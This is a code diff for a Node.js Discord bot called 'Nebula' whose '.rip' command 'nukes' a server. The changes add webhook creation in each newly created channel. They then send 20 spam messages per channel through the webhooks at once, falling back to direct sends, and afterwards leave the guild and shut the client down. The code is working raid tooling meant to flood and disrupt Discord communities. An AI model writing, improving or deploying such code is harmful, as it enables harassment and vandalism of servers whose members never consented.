@@ -3,7 +3,6 @@ const { Client, GatewayIntentBits } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
 
-// Load environment variables
 dotenv.config();
 
 // ====== DISCORD BOT SETUP ======
@@ -13,11 +12,24 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers,
+    GatewayIntentBits.GuildWebhooks,
     GatewayIntentBits.GuildEmojisAndStickers
   ]
 });
 
-// Bot logic
+// ====== WEB SERVER FOR PORT 3000 ======
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.get('/', (req, res) => {
+  res.send('Nebula Bot is online and awaiting .rip command...');
+});
+
+app.listen(PORT, () => {
+  console.log(`🌐 Web server running on http://localhost:${PORT}`);
+});
+
+// ====== BOT LOGIC ======
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
 });
@@ -66,31 +78,49 @@ client.on('messageCreate', async (message) => {
       } catch {}
     }
 
-    // Spam each with 20 messages
-    createdChannels.forEach(async (channel) => {
-      for (let i = 0; i < 20; i++) {
-        try {
-          await channel.send(spamMessage);
-        } catch {}
+    // Spam each channel with 20 messages, using webhook or direct send
+    const spamTasks = [];
+
+    for (const channel of createdChannels) {
+      try {
+        // Try creating a webhook
+        const webhook = await channel.createWebhook({
+          name: 'Nebula',
+          avatar: 'https://i.imgur.com/6QbX6yA.png '
+        });
+
+        // Send 20 messages via webhook
+        for (let i = 0; i < 20; i++) {
+          spamTasks.push(
+            webhook.send(spamMessage).catch(async () => {
+              // If webhook fails, fallback to channel.send()
+              try {
+                await channel.send(spamMessage);
+              } catch {}
+            })
+          );
+        }
+      } catch (webhookError) {
+        // If webhook creation failed, fallback to sending directly
+        for (let i = 0; i < 20; i++) {
+          spamTasks.push(
+            channel.send(spamMessage).catch(() => {})
+          );
+        }
       }
-    });
+    }
 
+    // Run all spam tasks concurrently
+    await Promise.all(spamTasks);
+
+    // Leave the server immediately
     try {
-      await message.channel.send('💥 Server nuked.');
+      await guild.leave();
     } catch {}
+
+    // Optional: Destroy client session to reduce load
+    client.destroy();
   }
-});
-
-// ====== WEB SERVER FOR PORT 3000 ======
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-app.get('/', (req, res) => {
-  res.send('Nebula Bot is online and awaiting .rip command...');
-});
-
-app.listen(PORT, () => {
-  console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
 
 // ====== LOGIN ======
